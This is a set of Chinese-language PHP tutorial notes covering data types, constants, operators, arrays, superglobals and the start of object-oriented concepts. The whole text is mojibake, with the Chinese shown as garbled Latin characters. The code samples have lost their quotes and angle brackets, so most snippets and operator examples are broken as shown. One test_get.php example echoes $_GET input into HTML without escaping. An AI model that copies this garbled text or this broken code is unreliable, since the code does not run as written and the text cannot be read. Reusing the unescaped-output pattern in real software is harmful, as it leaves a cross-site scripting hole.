Stringï¼ˆå­—ç¬¦ä¸²ï¼‰Integerï¼ˆæ•´å‹ï¼‰Floatï¼ˆæµ®ç‚¹å‹ï¼‰Booleanï¼ˆå¸ƒå°”å‹ï¼‰Arrayï¼ˆæ•°ç»„ï¼‰Objectï¼ˆå¯¹è±¡ï¼‰NULLï¼ˆç©ºå€¼ï¼‰Resourceï¼ˆèµ„æºç±»å‹ï¼‰ PHPå­—ç¬¦ä¸² ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸€ä¸²å­—ç¬¦çš„åºåˆ—ï¼Œå¯ä»¥å°†ä»»ä½•æ–‡æœ¬æ”¾åœ¨å•å¼•å·å’ŒåŒå¼•å·ä¸­ PHPæ•´å‹ æ•´æ•°æ˜¯ä¸€ä¸ªæ²¡æœ‰å°æ•°çš„æ•°å­—ï¼Œæ•´å‹å¯ä»¥ç”¨ä¸‰ç§æ ¼å¼æ¥æŒ‡å®šï¼šåè¿›åˆ¶ï¼Œ åå…­è¿›åˆ¶ï¼ˆ ä»¥ 0x ä¸ºå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆå‰ç¼€ä¸º 0ï¼‰ PHPå¸ƒå°”å‹ é€šå¸¸ç”¨äºæ¡ä»¶åˆ¤æ–­ PHPæ•°ç»„ æ•°ç»„å¯ä»¥åœ¨ä¸€ä¸ªå˜é‡ä¸­å­˜å‚¨å¤šä¸ªå€¼ $cars=array(Volvo,BMW,Toyota); PHPå¯¹è±¡ï¼ˆéš¾ç†è§£ï¼‰ å¯¹è±¡æ•°æ®ç±»å‹ä¹Ÿå¯ä»¥ç”¨äºå­˜å‚¨æ•°æ® å¿…é¡»ä½¿ç”¨classå…³é”®å­—å£°æ˜ç±»å¯¹è±¡ã€‚ç±»æ˜¯å¯ä»¥åŒ…å«å±æ€§å’Œæ–¹æ³•çš„ç»“æ„ PHP NULLå€¼ NULL å€¼è¡¨ç¤ºå˜é‡æ²¡æœ‰å€¼ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®å˜é‡å€¼ä¸º NULL æ¥æ¸…ç©ºå˜é‡æ•°æ® PHPèµ„æºç±»å‹ PHP èµ„æº resource æ˜¯ä¸€ç§ç‰¹æ®Šå˜é‡ï¼Œä¿å­˜äº†åˆ°å¤–éƒ¨èµ„æºçš„ä¸€ä¸ªå¼•ç”¨ å¸¸è§èµ„æºæ•°æ®ç±»å‹æœ‰æ‰“å¼€æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€å›¾å½¢ç”»å¸ƒåŒºåŸŸç­‰ PHPç±»å‹æ¯”è¾ƒ [!IMPORTANT] æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· == æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚ ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å· === æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚ å¤šç§ç±»å‹æ¯”è¾ƒ PHPå¸¸é‡ å¸¸é‡å¯ä»¥ç”¨ define() å‡½æ•°æˆ– const å…³é”®å­—æ¥å®šä¹‰ ä¸€æ—¦å®šä¹‰ï¼Œå…¶å€¼ä¸èƒ½æ”¹å˜ï¼Œå¯ä»¥åœ¨æ•´ä¸ªè„šæœ¬çš„ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨ï¼Œæ— éœ€ä½¿ç”¨ global å…³é”®å­— ç”¨ define() å‡½æ•° bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) **nameï¼š**å¿…é€‰å‚æ•°ï¼Œå¸¸é‡åç§°ï¼Œå³æ ‡å¿—ç¬¦ã€‚ **valueï¼š**å¿…é€‰å‚æ•°ï¼Œå¸¸é‡çš„å€¼ã€‚ case_insensitive ï¼šå¯é€‰å‚æ•°ï¼Œå¦‚æœè®¾ç½®ä¸º TRUEï¼Œè¯¥å¸¸é‡åˆ™å¤§å°å†™ä¸æ•æ„Ÿï¼Œé»˜è®¤æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ å¦‚ define(GREETING, æ¬¢è¿è®¿é—® Runoob.com, true); ç”¨const å…³é”®å­— const CONSTANT_NAME = value; å¦‚ const SITE_URL = https://www.runoob.com; é¢„å®šä¹‰å¸¸é‡ PHP æä¾›äº†ä¸€äº›é¢„å®šä¹‰å¸¸é‡ï¼Œå¯ä»¥åœ¨è„šæœ¬ä¸­ç›´æ¥ä½¿ç”¨ã€‚è¿™äº›å¸¸é‡é€šå¸¸ç”¨äºè·å– PHP çš„é…ç½®ä¿¡æ¯ã€ç‰ˆæœ¬ä¿¡æ¯ç­‰ PHP_VERSIONï¼šå½“å‰ PHP è§£æå™¨çš„ç‰ˆæœ¬ã€‚ PHP_OSï¼šæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿã€‚ PHP_INT_MAXï¼šæœ€å¤§çš„æ•´æ•°å€¼ã€‚ E_ERRORã€E_WARNINGã€E_PARSE ç­‰ï¼šé”™è¯¯æŠ¥å‘Šçº§åˆ« PHPå­—ç¬¦ä¸²å˜é‡ å­—ç¬¦ä¸²å˜é‡ç”¨äºå­˜å‚¨å¹¶å¤„ç†æ–‡æœ¬ PHP ä¸­çš„å­—ç¬¦ä¸²å˜é‡ å½“èµ‹ä¸€ä¸ªæ–‡æœ¬å€¼ç»™å˜é‡æ—¶ï¼Œè®°å¾—ç»™æ–‡æœ¬å€¼åŠ ä¸Šå•å¼•å·æˆ–è€…åŒå¼•å·ã€‚ ?php$txt=Hello world!;echo $txt;? PHP å¹¶ç½®è¿ç®—ç¬¦ å¹¶ç½®è¿ç®—ç¬¦ (.) ç”¨äºæŠŠä¸¤ä¸ªå­—ç¬¦ä¸²å€¼è¿æ¥èµ·æ¥ ?php$txt1=Hello world!;$txt2=What a nice day!;echo $txt1 . . $txt2;? ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å·²ç»ä½¿ç”¨äº†ä¸¤æ¬¡å¹¶ç½®è¿ç®—ç¬¦ã€‚è¿™æ˜¯ç”±äºæˆ‘ä»¬éœ€è¦åœ¨ä¸¤ä¸ªå­—ç¬¦ä¸²ä¹‹é—´æ’å…¥ä¸€ä¸ªç©ºæ ¼ PHP strlen() å‡½æ•° strlen() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰ PHP strpos() å‡½æ•° strpos() å‡½æ•°ç”¨äºåœ¨å­—ç¬¦ä¸²å†…æŸ¥æ‰¾ä¸€ä¸ªå­—ç¬¦æˆ–ä¸€æ®µæŒ‡å®šçš„æ–‡æœ¬ã€‚ å¦‚æœåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°åŒ¹é…ï¼Œè¯¥å‡½æ•°ä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦ä½ç½®ã€‚å¦‚æœæœªæ‰¾åˆ°åŒ¹é…ï¼Œåˆ™è¿”å› FALSEã€‚ PHP 5 String å‡½æ•° PHPè¿ç®—ç¬¦ ç®—æœ¯è¿ç®—ç¬¦ è¿ç®—ç¬¦ åç§° æè¿° å®ä¾‹ ç»“æœ x + y åŠ  x å’Œ y çš„å’Œ 2 + 2 4 x - y å‡ x å’Œ y çš„å·® 5 - 2 3 x * y ä¹˜ x å’Œ y çš„ç§¯ 5 * 2 10 x / y é™¤ x å’Œ y çš„å•† 15 / 5 3 x % y æ¨¡ï¼ˆé™¤æ³•çš„ä½™æ•°ï¼‰ x é™¤ä»¥ y çš„ä½™æ•° 5 % 2 10 % 8 10 % 2 1 2 0 -x è®¾ç½®è´Ÿæ•° å– x çš„ç›¸åç¬¦å· ?php $x = 2; echo -$x; ? -2 ~x å–å x å–åï¼ŒæŒ‰äºŒè¿›åˆ¶ä½è¿›è¡Œå–åè¿ç®—ã€‚è¿ç®—è§„åˆ™ï¼š~1=-2; ~0=-1; ?php $x = 2; echo ~$x; ? -3 a . b å¹¶ç½® è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸² â€œHiâ€ . â€œHaâ€ HiHa æ•´é™¤è¿ç®—ç¬¦ intdiv()ï¼Œè¯¥å‡½æ•°è¿”å›å€¼ä¸ºç¬¬ä¸€ä¸ªå‚æ•°é™¤äºç¬¬äºŒä¸ªå‚æ•°çš„å€¼å¹¶å–æ•´ï¼ˆå‘ä¸‹å–æ•´ï¼‰ var_dump(intdiv(10, 3));ä¼šè¾“å‡ºint(3) [!IMPORTANT] var_dump() æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„è°ƒè¯•å‡½æ•°ï¼Œç”¨äºè¾“å‡ºå˜é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ•°æ®ç±»å‹å’Œå€¼ èµ‹å€¼è¿ç®—ç¬¦ è¿ç®—ç¬¦ ç­‰åŒäº æè¿° x = y x = y å·¦æ“ä½œæ•°è¢«è®¾ç½®ä¸ºå³ä¾§è¡¨è¾¾å¼çš„å€¼ x += y x = x + y åŠ  x -= y x = x - y å‡ x *= y x = x * y ä¹˜ x /= y x = x / y é™¤ x %= y x = x % y æ¨¡ï¼ˆé™¤æ³•çš„ä½™æ•°ï¼‰ a .= b a = a . b è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸² é€’å¢/é€’å‡è¿ç®—ç¬¦ è¿ç®—ç¬¦ åç§° æè¿° ++ x é¢„é€’å¢ x åŠ  1ï¼Œç„¶åè¿”å› x x ++ åé€’å¢ è¿”å› xï¼Œç„¶å x åŠ  1 â€“ x é¢„é€’å‡ x å‡ 1ï¼Œç„¶åè¿”å› x x â€“ åé€’å‡ è¿”å› xï¼Œç„¶å x å‡ 1 æ¯”è¾ƒè¿ç®—ç¬¦ è¿ç®—ç¬¦ åç§° æè¿° å®ä¾‹ x == y ç­‰äº å¦‚æœ x ç­‰äº yï¼Œåˆ™è¿”å› true 5==8 è¿”å› false x === y ç»å¯¹ç­‰äº å¦‚æœ x ç­‰äº yï¼Œä¸”å®ƒä»¬ç±»å‹ç›¸åŒï¼Œåˆ™è¿”å› true 5===â€œ5â€ è¿”å› false x != y ä¸ç­‰äº å¦‚æœ x ä¸ç­‰äº yï¼Œåˆ™è¿”å› true 5!=8 è¿”å› true x y ä¸ç­‰äº å¦‚æœ x ä¸ç­‰äº yï¼Œåˆ™è¿”å› true 58 è¿”å› true x !== y ä¸ç»å¯¹ç­‰äº å¦‚æœ x ä¸ç­‰äº yï¼Œæˆ–å®ƒä»¬ç±»å‹ä¸ç›¸åŒï¼Œåˆ™è¿”å› true 5!==â€œ5â€ è¿”å› true x y å¤§äº å¦‚æœ x å¤§äº yï¼Œåˆ™è¿”å› true 58 è¿”å› false x y å°äº å¦‚æœ x å°äº yï¼Œåˆ™è¿”å› true 58 è¿”å› true x = y å¤§äºç­‰äº å¦‚æœ x å¤§äºæˆ–è€…ç­‰äº yï¼Œåˆ™è¿”å› true 5=8 è¿”å› false x = y å°äºç­‰äº å¦‚æœ x å°äºæˆ–è€…ç­‰äº yï¼Œåˆ™è¿”å› true 5=8 è¿”å› true é€»è¾‘è¿ç®—ç¬¦ è¿ç®—ç¬¦ åç§° æè¿° å®ä¾‹ x and y ä¸ å¦‚æœ x å’Œ y éƒ½ä¸º trueï¼Œåˆ™è¿”å› true x=6 y=3 (x 10 and y 1) è¿”å› true x or y æˆ– å¦‚æœ x å’Œ y è‡³å°‘æœ‰ä¸€ä¸ªä¸º trueï¼Œåˆ™è¿”å› true x=6 y=3 (x6 or y5) è¿”å› true x xor y å¼‚æˆ– å¦‚æœ x å’Œ y æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªä¸º trueï¼Œåˆ™è¿”å› true x=6 y=3 (x6 xor y3) è¿”å› false x y ä¸ å¦‚æœ x å’Œ y éƒ½ä¸º trueï¼Œåˆ™è¿”å› true x=6 y=3 (x 10 y 1) è¿”å› true x || y æˆ– å¦‚æœ x å’Œ y è‡³å°‘æœ‰ä¸€ä¸ªä¸º trueï¼Œåˆ™è¿”å› true x=6 y=3 (x5 || y5) è¿”å› false ! x é å¦‚æœ x ä¸ä¸º trueï¼Œåˆ™è¿”å› true x=6 y=3 !(x==y) è¿”å› true æ•°ç»„è¿ç®—ç¬¦ è¿ç®—ç¬¦ åç§° æè¿° x + y é›†åˆ x å’Œ y çš„é›†åˆ x == y ç›¸ç­‰ å¦‚æœ x å’Œ y å…·æœ‰ç›¸åŒçš„é”®/å€¼å¯¹ï¼Œåˆ™è¿”å› true x === y æ’ç­‰ å¦‚æœ x å’Œ y å…·æœ‰ç›¸åŒçš„é”®/å€¼å¯¹ï¼Œä¸”é¡ºåºç›¸åŒç±»å‹ç›¸åŒï¼Œåˆ™è¿”å› true x != y ä¸ç›¸ç­‰ å¦‚æœ x ä¸ç­‰äº yï¼Œåˆ™è¿”å› true x y ä¸ç›¸ç­‰ å¦‚æœ x ä¸ç­‰äº yï¼Œåˆ™è¿”å› true x !== y ä¸æ’ç­‰ å¦‚æœ x ä¸ç­‰äº yï¼Œåˆ™è¿”å› true ä¸‰å…ƒè¿ç®—ç¬¦ (expr1) ? (expr2) : (expr3) ä»¥ä¸‹å®ä¾‹ä¸­é€šè¿‡åˆ¤æ–­ $_GET è¯·æ±‚ä¸­å«æœ‰ user å€¼ï¼Œå¦‚æœæœ‰è¿”å› $_GET[â€˜userâ€™]ï¼Œå¦åˆ™è¿”å› nobodyï¼š ?php// æ™®é€šå†™æ³•$username = isset($_GET[user]) ? $_GET[user] : nobody;echo $username, PHP_EOL; // PHP 5.3+ ç‰ˆæœ¬å†™æ³•$username = $_GET[user] ?: nobody;echo $username, PHP_EOL;// PHP 7+ ç‰ˆæœ¬å†™æ³•$username = $_GET[user] ?? nobody;echo $username, PHP_EOL;? æ³¨ï¼šPHP_EOL æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦ ç»„åˆæ¯”è¾ƒç¬¦(PHP7+) ç¬¦å·ä¸º =ã€‚ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦å¯ä»¥è½»æ¾å®ç°ä¸¤ä¸ªå˜é‡çš„æ¯”è¾ƒï¼Œä¸ä»…é™äºæ•°å€¼ç±»æ•°æ®çš„æ¯”è¾ƒ $c = $a = $b; å¦‚æœ $a bâˆ—âˆ—,åˆ™âˆ—âˆ—b**, åˆ™ **bâˆ—âˆ—,åˆ™âˆ—âˆ—c çš„å€¼ä¸º 1ã€‚ å¦‚æœ $a == bâˆ—âˆ—,åˆ™âˆ—âˆ—b**, åˆ™ **bâˆ—âˆ—,åˆ™âˆ—âˆ—c çš„å€¼ä¸º 0ã€‚ å¦‚æœ $a bâˆ—âˆ—,åˆ™âˆ—âˆ—b**, åˆ™ **bâˆ—âˆ—,åˆ™âˆ—âˆ—c çš„å€¼ä¸º -1ã€‚ è¿ç®—ç¬¦ä¼˜å…ˆçº§ ä¸‹è¡¨æŒ‰ç…§ä¼˜å…ˆçº§ä»é«˜åˆ°ä½åˆ—å‡ºäº†è¿ç®—ç¬¦ è¯´æ˜ï¼šå·¦ ï¼ ä»å·¦åˆ°å³ï¼Œå³ ï¼ ä»å³åˆ°å·¦ ç»“åˆæ–¹å‘ è¿ç®—ç¬¦ é™„åŠ ä¿¡æ¯ æ—  clone new clone å’Œ new å·¦ [ array() å³ ++ â€“ ~ (int) (float) (string) (array) (object) (bool) @ ç±»å‹å’Œé€’å¢ï¼é€’å‡ æ—  instanceof ç±»å‹ å³ ! é€»è¾‘è¿ç®—ç¬¦ å·¦ * / % ç®—æœ¯è¿ç®—ç¬¦ å·¦ + â€“ . ç®—æœ¯è¿ç®—ç¬¦å’Œå­—ç¬¦ä¸²è¿ç®—ç¬¦ å·¦ ä½è¿ç®—ç¬¦ æ—  == != === !== æ¯”è¾ƒè¿ç®—ç¬¦ å·¦ ä½è¿ç®—ç¬¦å’Œå¼•ç”¨ å·¦ ^ ä½è¿ç®—ç¬¦ å·¦ | ä½è¿ç®—ç¬¦ å·¦ é€»è¾‘è¿ç®—ç¬¦ å·¦ || é€»è¾‘è¿ç®—ç¬¦ å·¦ ? : ä¸‰å…ƒè¿ç®—ç¬¦ å³ = += -= *= /= .= %= = |= ^= = = = èµ‹å€¼è¿ç®—ç¬¦ å·¦ and é€»è¾‘è¿ç®—ç¬¦ å·¦ xor é€»è¾‘è¿ç®—ç¬¦ å·¦ or é€»è¾‘è¿ç®—ç¬¦ å·¦ , å¤šå¤„ç”¨åˆ° ?php// ä¼˜å…ˆçº§ï¼š = and// ä¼˜å…ˆçº§ï¼š || = or $a = 3;$b = false;$c = $a or $b;var_dump($c); // è¿™é‡Œçš„ $c ä¸º int å€¼3ï¼Œè€Œä¸æ˜¯ boolean å€¼ trueï¼›è¾“å‡ºint(3)$d = $a || $b;var_dump($d); //è¿™é‡Œçš„ $d å°±æ˜¯ boolean å€¼ true ;è¾“å‡ºbool(true)? PHP æ¡ä»¶è¯­å¥ if è¯­å¥ - åœ¨æ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œä»£ç  ifâ€¦else è¯­å¥ - åœ¨æ¡ä»¶æˆç«‹æ—¶æ‰§è¡Œä¸€å—ä»£ç ï¼Œæ¡ä»¶ä¸æˆç«‹æ—¶æ‰§è¡Œå¦ä¸€å—ä»£ç  ifâ€¦elseifâ€¦else è¯­å¥ - åœ¨è‹¥å¹²æ¡ä»¶ä¹‹ä¸€æˆç«‹æ—¶æ‰§è¡Œä¸€ä¸ªä»£ç å— switch è¯­å¥ - åœ¨è‹¥å¹²æ¡ä»¶ä¹‹ä¸€æˆç«‹æ—¶æ‰§è¡Œä¸€ä¸ªä»£ç å— PHPæ•°ç»„ åœ¨ PHP ä¸­ï¼Œarray() å‡½æ•°ç”¨äºåˆ›å»ºæ•°ç»„ ?php$cars=array(Volvo,BMW,Toyota);echo I like . $cars[0] . , . $cars[1] . and . $cars[2] . .;? è·å–æ•°ç»„çš„é•¿åº¦ count() å‡½æ•°ç”¨äºè¿”å›æ•°ç»„çš„é•¿åº¦ï¼ˆå…ƒç´ çš„æ•°é‡ï¼‰ éå†æ•°å€¼æ•°ç»„ éå†å¹¶æ‰“å°æ•°å€¼æ•°ç»„ä¸­çš„æ‰€æœ‰å€¼ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ for å¾ªç¯ PHP å…³è”æ•°ç»„ å…³è”æ•°ç»„æ˜¯ä½¿ç”¨åˆ†é…ç»™æ•°ç»„çš„æŒ‡å®šçš„é”®çš„æ•°ç»„ ?php$age=array(Peter=35,Ben=37,Joe=43);echo Peter is . $age[Peter] . years old.;? éå†å…³è”æ•°ç»„ éå†å¹¶æ‰“å°å…³è”æ•°ç»„ä¸­çš„æ‰€æœ‰å€¼ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ foreach å¾ªç¯ ?php$age=array(Peter=35,Ben=37,Joe=43); foreach($age as $x=$x_value) echo Key= . $x . , Value= . $x_value; echo br;? [!IMPORTANT] foreach åœ¨ PHP ä¸­ï¼Œforeach å¾ªç¯æ˜¯ä¸€ç§ä¸“é—¨ç”¨äºéå†æ•°ç»„æˆ–å¯¹è±¡çš„ç»“æ„ ç›¸æ¯”äº for æˆ– while å¾ªç¯ï¼Œforeach èƒ½æ›´è‡ªç„¶åœ°å¤„ç†å¤æ‚æ•°æ®ç»“æ„ï¼Œå¦‚å…³è”æ•°ç»„æˆ–å¯¹è±¡ åŸºæœ¬è¯­æ³• éå†æ•°ç»„ foreach ($array as $value) // å¾ªç¯ä½“ $arrayï¼šéœ€è¦éå†çš„æ•°ç»„ã€‚ $valueï¼šå½“å‰å¾ªç¯ä¸­æ•°ç»„çš„å€¼ã€‚ éå†æ•°ç»„çš„é”®å€¼å¯¹ foreach ($array as $key = $value) // å¾ªç¯ä½“ $keyï¼šå½“å‰å…ƒç´ çš„é”®ã€‚ $valueï¼šå½“å‰å…ƒç´ çš„å€¼ã€‚ å®ä¾‹ ç®€å•æ•°ç»„ ?php$x=array(Google,Runoob,Taobao);foreach ($x as $value) echo $value . PHP_EOL;? å…³è”æ•°ç»„ ?php$x=array(1=Google, 2=Runoob, 3=Taobao);foreach ($x as $key = $value) echo key ä¸º . $key . ï¼Œå¯¹åº”çš„ value ä¸º . $value . PHP_EOL;? åµŒå¥—æ•°ç»„ ?php$users = [ [name = John, age = 30], [name = Jane, age = 25], [name = Doe, age = 40]];foreach ($users as $user) foreach ($user as $key = $value) echo $key: $value, ; echo ;? éå†å¯¹è±¡ ?phpclass Car public $brand = Toyota; public $model = Corolla; public $year = 2022;$car = new Car();foreach ($car as $property = $value) echo $property: $value ;? æ•°ç»„æ’åº æ•°ç»„ä¸­çš„å…ƒç´ å¯ä»¥æŒ‰å­—æ¯æˆ–æ•°å­—é¡ºåºè¿›è¡Œé™åºæˆ–å‡åºæ’åˆ— sort() å¯¹æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— rsort() å¯¹æ•°ç»„è¿›è¡Œé™åºæ’åˆ— asort() æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— ?php$age=array(Peter=35,Ben=37,Joe=43);asort($age);? arsort() æ ¹æ®æ•°ç»„çš„å€¼ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œé™åºæ’åˆ— ksort() æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œå‡åºæ’åˆ— krsort() æ ¹æ®æ•°ç»„çš„é”®ï¼Œå¯¹å…³è”æ•°ç»„è¿›è¡Œé™åºæ’åˆ— PHP è¶…çº§å…¨å±€å˜é‡ è¶…çº§å…¨å±€å˜é‡åœ¨ä¸€ä¸ªè„šæœ¬çš„å…¨éƒ¨ä½œç”¨åŸŸä¸­éƒ½å¯ç”¨ PHP è¶…çº§å…¨å±€å˜é‡åˆ—è¡¨: $GLOBALS $_SERVER $_REQUEST $_POST $_GET $_FILES $_ENV $_COOKIE $_SESSION PHP $GLOBALS $GLOBALS æ˜¯ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ PHP $_SERVER $_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ PHP $_REQUEST PHP $_REQUEST ç”¨äºæ”¶é›†HTMLè¡¨å•æäº¤çš„æ•°æ® PHP $_POST PHP $_POST è¢«å¹¿æ³›åº”ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨HTML formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼šmethod=â€œpostâ€ã€‚ PHP $_GET PHP $_GET åŒæ ·è¢«å¹¿æ³›åº”ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨HTML formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼šmethod=â€œgetâ€ $_GET ä¹Ÿå¯ä»¥æ”¶é›†URLä¸­å‘é€çš„æ•°æ® å‡å®šæˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«å‚æ•°çš„è¶…é“¾æ¥HTMLé¡µé¢ï¼š htmlbodya href=test_get.php?subject=PHPweb=runoob.comTest $GET/a/body/html å½“ç”¨æˆ·ç‚¹å‡»é“¾æ¥ â€œTest $GETâ€, å‚æ•° â€œsubjectâ€ å’Œ â€œwebâ€ å°†å‘é€è‡³test_get.php,ä½ å¯ä»¥åœ¨ â€œtest_get.phpâ€ æ–‡ä»¶ä¸­ä½¿ç”¨ $_GET å˜é‡æ¥è·å–è¿™äº›æ•°æ®ã€‚ä»¥ä¸‹ä¸º â€œtest_get.phpâ€ æ–‡ä»¶çš„ä»£ç : html body ?php echo Study . $_GET[subject] . @ . $_GET[web]; ? /body /html PHPå¾ªç¯ while - åªè¦æŒ‡å®šçš„æ¡ä»¶æˆç«‹ï¼Œåˆ™å¾ªç¯æ‰§è¡Œä»£ç å— doâ€¦while - é¦–å…ˆæ‰§è¡Œä¸€æ¬¡ä»£ç å—ï¼Œç„¶ååœ¨æŒ‡å®šçš„æ¡ä»¶æˆç«‹æ—¶é‡å¤è¿™ä¸ªå¾ªç¯ for - å¾ªç¯æ‰§è¡Œä»£ç å—æŒ‡å®šçš„æ¬¡æ•° foreach - æ ¹æ®æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ æ¥å¾ªç¯ä»£ç å— PHPé¢å‘å¯¹è±¡ï¼ˆéš¾ç†è§£ï¼‰ é¢å‘å¯¹è±¡ï¼ˆObject-Orientedï¼Œç®€ç§° OOï¼‰æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³å’Œæ–¹æ³•ï¼Œå®ƒå°†ç¨‹åºä¸­çš„æ•°æ®å’Œæ“ä½œæ•°æ®çš„æ–¹æ³•å°è£…åœ¨ä¸€èµ·ï¼Œå½¢æˆå¯¹è±¡ï¼Œå¹¶é€šè¿‡å¯¹è±¡ä¹‹é—´çš„äº¤äº’å’Œæ¶ˆæ¯ä¼ é€’æ¥å®Œæˆç¨‹åºçš„åŠŸèƒ½ å…³é”®æ¦‚å¿µ æ¦‚å¿µ è¯´æ˜ ç±»ï¼ˆclassï¼‰ å¯¹è±¡çš„æ¨¡æ¿ï¼Œå®šä¹‰å±æ€§å’Œæ–¹æ³• å¯¹è±¡ï¼ˆobjectï¼‰ é€šè¿‡ç±»å®ä¾‹åŒ–çš„å…·ä½“å¯¹è±¡ å±æ€§ï¼ˆpropertyï¼‰ ç±»ä¸­çš„å˜é‡ï¼ˆä¹Ÿå«æˆå‘˜å˜é‡ï¼‰ æ–¹æ³•ï¼ˆmethodï¼‰ ç±»ä¸­çš„å‡½æ•° æ„é€ æ–¹æ³•ï¼ˆ__constructï¼‰ å®ä¾‹åŒ–å¯¹è±¡æ—¶è‡ªåŠ¨æ‰§è¡Œ ææ„æ–¹æ³•ï¼ˆ__destructï¼‰ å¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨æ‰§è¡Œ ç»§æ‰¿ï¼ˆextendsï¼‰ å­ç±»ç»§æ‰¿çˆ¶ç±»çš„æ–¹æ³•å’Œå±æ€§ å¤šæ€ï¼ˆpolymorphismï¼‰ ä¸åŒç±»å¯ä»¥å®ç°ç›¸åŒçš„æ–¹æ³• å°è£…ï¼ˆencapsulationï¼‰ é™åˆ¶å±æ€§å’Œæ–¹æ³•çš„è®¿é—®æƒé™ æ¥å£ï¼ˆinterfaceï¼‰ å®šä¹‰ç±»å¿…é¡»å®ç°çš„æ–¹æ³• æŠ½è±¡ç±»ï¼ˆabstractï¼‰ ä¸èƒ½å®ä¾‹åŒ–çš„ç±»ï¼Œå¿…é¡»è¢«å­ç±»ç»§æ‰¿ ç±»ï¼ˆclassï¼‰ class Person // å®šä¹‰å±æ€§ï¼šå±æ€§æ˜¯ç±»ä¸­å®šä¹‰çš„å˜é‡ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„çŠ¶æ€ public $name; public $age; // æ„é€ æ–¹æ³• public function __construct($name, $age) $this-name = $name; $this-age = $age; // å®šä¹‰æ–¹æ³•ï¼šæ–¹æ³•æ˜¯ç±»ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œç”¨äºå®šä¹‰å¯¹è±¡çš„è¡Œä¸º public function sayHello() return Hello, my name is . $this-name; ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œå®šä¹‰å±æ€§å’Œæ–¹æ³•ï¼Œç±»ä½¿ç”¨ class å…³é”®å­—ååŠ ä¸Šç±»åå®šä¹‰ï¼Œç±»ååçš„ä¸€å¯¹å¤§æ‹¬å·({})å†…å¯ä»¥å®šä¹‰å˜é‡å’Œæ–¹æ³•ï¼Œç±»çš„å˜é‡ä½¿ç”¨ var æ¥å£°æ˜, å˜é‡ä¹Ÿå¯ä»¥åˆå§‹åŒ–å€¼ [!CAUTION] ç±»ï¼Œå¯¹è±¡ï¼Œå½“å‰å¯¹è±¡çš„å…³ç³» ç±» æ˜¯ä¸€ç§æ¨¡æ¿æˆ–è“å›¾ã€‚æ¯”å¦‚ï¼Œclass Car ... æ˜¯ä¸€ä¸ªæ±½è½¦çš„æ¨¡æ¿ã€‚ å¯¹è±¡ æ˜¯ä»ç±»ç”Ÿæˆçš„å…·ä½“å®ä¾‹ã€‚æ¯”å¦‚ï¼Œ$car1 = new Car(); æ˜¯ä¸€è¾†å…·ä½“çš„æ±½è½¦ã€‚ å½“å‰å¯¹è±¡ æ˜¯æŸä¸€æ—¶åˆ»ä½ æ­£åœ¨æ“ä½œçš„å¯¹è±¡ã€‚å¦‚æœä½ æ­£åœ¨å¯¹ $car1 è°ƒç”¨æ–¹æ³•ï¼Œé‚£ä¹ˆ $car1 å°±æ˜¯å½“å‰å¯¹è±¡ï¼Œ$this å°±æ˜¯æŒ‡å½“å‰å¯¹è±¡ï¼Œåœ¨æ–¹æ³•é‡Œç”¨ $this æ¥è®¿é—®æˆ–ä¿®æ”¹å®ƒçš„å±æ€§å’Œæ–¹æ³•ã€‚ å¯¹è±¡ï¼ˆobjectï¼‰ 